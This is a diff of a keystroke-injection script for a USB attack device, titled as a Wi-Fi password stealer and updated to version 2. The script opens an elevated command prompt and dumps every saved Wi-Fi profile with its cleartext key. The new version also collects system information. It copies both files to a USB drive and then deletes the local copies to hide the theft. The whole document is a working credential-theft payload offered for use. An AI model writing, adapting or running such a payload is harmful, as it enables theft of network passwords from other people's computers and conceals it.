@@ -1,19 +1,27 @@
-REM Wi-Fi passwords stealer by Russanandres v1.0
-REM WARNING! you need a USB flash drive to get passwords!
+REM Wi-Fi passwords stealer by Russanandres v2
+REM WARNING! you need a USB flash drive letter E:\ to get passwords!
 
 GUI r
 DELAY 500
 STRING powershell Start-Process cmd -verb runAs
-DELAY 500
 ENTER
 DELAY 2500
 STRING netsh wlan show profile name=* key=clear > p4s5w04d5
-DELAY 1000
 ENTER
+DELAY 500
+STRING systeminfo > 5y5i2f
+ENTER
+DELAY 2500
 STRING copy p4s5w04d5 E:\
 ENTER
-DELAY 2000
+DELAY 500
+STRING copy 5y5i2f E:\
+ENTER
+DELAY 500
 STRING del p4s5w04d5
+ENTER
+DELAY 500
+STRING del 5y5i2f
 ENTER
 DELAY 500
 STRING exit
